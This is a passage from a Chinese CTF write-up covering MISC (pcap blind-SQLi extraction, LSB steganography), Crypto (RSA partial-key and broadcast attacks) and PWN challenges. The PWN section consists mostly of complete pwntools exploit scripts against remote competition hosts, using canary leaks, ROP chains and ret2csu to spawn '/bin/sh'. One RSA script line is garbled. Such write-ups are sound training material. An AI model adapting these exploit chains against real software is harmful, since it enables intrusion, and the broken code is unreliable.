    aa = ['' for i in range(1000)]
    for t in lis:
        aa[int(t[0])] = chr(int(t[1]))
    for i in aa:
        print(i,end="")
    #flag{w1reshARK_ez_1sntit}~~~~ flag{w1reshARK_ez_1sntit}
###  A_MISC
爆破压缩包密码得到qwer
修改图片高度得到
提取码cavb
同样的做法
    import re
    s = r"from%20t\),([0-9]*),1\)\)=([0-9]*)"
    pat = re.compile(s)
    f = open("timu.pcapng","rb")
    st = f.read().decode("utf-8","ignore")
    lis = pat.findall(st)
    aa = ['' for i in range(1000)]
    for t in lis:
        aa[int(t[0])] = chr(int(t[1]))
    for i in aa:
        print(i,end="")
> flag{cd2c3e2fea463ded9af800d7155be7aq}
###  MISC2
LSB隐写提取得到
    flag{h0w_4bouT_enc0de_4nd_pnG}
直接cyberchef解码
> flag{h0w_4bouT_enc0de_4nd_pnG}
###  MI
[ctf02 | Glun](http://www.glun.top/2020/10/05/ctf02/)
## Crypto
###  a_crypto
###  easy_crypto
社会主义核心价值观解密
###  babyrsa
    from gmpy2 import *
    from Crypto.Util.number import *
    p1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479
    q0 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623
    n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969
    mod=pow(2,265)
    p0=n*invert(q0,mod)%mod
    pbar=(p1 = PolynomialRing(Zmod(n))
    for i in range(32):
        f=pbar+x*mod*32
        f=f.monic()
        pp=f.small_roots(X=2^454,beta=0.4)
        if(pp):
            break
        pbar+=mod
    p=pbar+pp[0]*32*mod
    assert n%p==0
    print(p)
    q=n//p
    phi=(p-1)*(q-1)
    e=65537
    d=invert(e,phi)
    c=19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188
    m=pow(c,d,n)
    print(long_to_bytes(m))
    #flag{ef5e1582-8116-4f61-b458-f793dc03f2ff}
###  Crazy_Rsa_Tech
    # -*- coding: cp936 -*-    import gmpy2
    import time
    def CRT(items):
            N = reduce(lambda x, y: x * y, (i[1] for i in items))
            result = 0
            for a, n in items:
                    m = N / n
                    d, r, s = gmpy2.gcdext(n, m)
                    if d != 1: raise Exception("Input not pairwise co-prime")
                    result += a * s * m
            return result % N, N
    # 读入 e, n, c
    e = 9
    n = [71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799, 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949, 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919, 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847, 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147, 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377, 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281, 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951, 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]
    c = [62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839, 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981, 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376, 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996, 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]
    print '[+]Detecting m...'
    data = zip(c, n)
    x, n = CRT(data)
    realnum = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()
    print '  [-]m is: ' + '{:x}'.format(int(realnum)).decode('hex')
    print '[!]All Done!'
## PWN
###  littleof
    from pwn import *
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    #r = process("./littleof")
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    r = remote("182.116.62.85",27056)
    libc = ELF("./libc-2.27.so")
    payload = "a" * 8 * 9
    r.sendlineafter("Do you know how to do buffer overflow?\n",payload)
    r.recvuntil(payload + "\n")
    canary = u64(r.recv(7).rjust(8,"\x00"))
    stack = u64(r.recv(6).ljust(8,"\x00"))
    success("canary : " + hex(canary))
    success("stack : " + hex(stack))
    payload = "a" * 8 * 9
    payload += p64(canary)
    payload += p64(stack)
    payload += p64(0x4007f1)
    payload += p64(0x400800)
    payload += p64(0x400860)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0x400789)
    r.sendlineafter("harder!",payload)
    payload = "a" * 8
    r.sendlineafter("Do you know how to do buffer overflow?\n",payload)
    r.recvuntil(payload)
    libc_base = u64(r.recv(6).ljust(8,"\x00")) - 0xa - libc.sym["_IO_2_1_stdin_"]
    success("libc_base : " + hex(libc_base))
    p_rdi_r = libc_base + 0x00000000000215bf
    p_rsi_r = libc_base + 0x0000000000023eea
    p_rdx_r = libc_base + 0x0000000000001b96
    sh_addr = libc_base + libc.search('/bin/sh').next()
    system_addr = libc_base + libc.sym["execve"]
    payload = "a" * 8 * 9
    payload += p64(canary)
    payload += "b" * 8
    payload += p64(p_rdi_r)
    payload += p64(sh_addr)
    payload += p64(p_rsi_r)
    payload += p64(0)
    payload += p64(p_rdx_r)
    payload += p64(0)
    payload += p64(system_addr)
    r.sendlineafter("harder!",payload)
    r.interactive()
###  babyof
    from pwn import *
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    def ret2csu(offset,csu_end_addr,csu_front_addr,rdx,rsi,edi,call_target,last_ret,rbx = 0,rbp = 1):
        '''
        rdx = r15
        rsi = r14
        edi = r13d
        call [r12 + rbx * 8]
        rbx + 1 == rbp
        '''
        payload = ""
        payload += "a" * offset
        payload += "b" * 0x8
        payload += p64(csu_end_addr) # ret_addr
        payload += p64(rbx) # rbx
        payload += p64(rbp) # rbp
        payload += p64(call_target) # r12
        payload += p64(edi) # r13
        payload += p64(rsi) # r14
        payload += p64(rdx) # r15
        payload += p64(csu_front_addr)
        payload += p64(0) * 7
        payload += p64(last_ret)
        return payload
    #r = process("./babyof")
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF("./babyof")
    r = remote("182.116.62.85",21613)
    libc = ELF("./libc-2.27.so")
    r.recvuntil("Do you know how to do buffer overflow?")
    # puts(puts_got)
    edi = elf.got["puts"]
    rsi = 0
    rdx = 0
    call_target = elf.got["puts"]
    main_addr = 0x40066B 
    payload = ret2csu(0x40,0x40073A,0x400720,rdx,rsi,edi,call_target,main_addr)
    r.sendline(payload)
    r.recvuntil("I hope you win\n")
    libc_base = u64(r.recvuntil("\n",drop = True).ljust(8,"\x00")) - libc.sym["puts"]
    success("libc_base : " + hex(libc_base))
    # read(0,bss_base,0x10)
    bss_base = 0x601100
    edi = 0
    rsi = bss_base
    rdx = 0x10
    call_target = elf.got["read"]
    main_addr = 0x40066B 
    payload = ret2csu(0x40,0x40073A,0x400720,rdx,rsi,edi,call_target,main_addr)
    r.send(payload)
    sleep(0.5)
    execve_addr = libc_base + libc.sym["execve"]
    payload = ""
    payload += p64(execve_addr)
    payload += "/bin/sh\x00"
    r.send(payload)
    # execve("/bin/sh")
    edi = bss_base + 8
    rsi = 0
    rdx = 0
    call_target = bss_base
    main_addr = 0x40066B 
    payload = ret2csu(0x40,0x40073A,0x400720,rdx,rsi,edi,call_target,main_addr)
    r.send(payload)
    r.interactive()
###  onecho
    from pwn import *
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    def dbg(cmd = ""):
        gdb.attach(r,cmd)
    #r = process("./onecho")
    #libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")
    elf = ELF("./onecho")
    r = remote("182.116.62.85",24143)
    libc = ELF("./libc.so.6")
    main_addr = 0x8049220
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    bss_addr = 0x0804C100
    p_ebx_r = 0x08049022
    p_edi_ebp_r = 0x08049812
    payload = b"./flag\x00"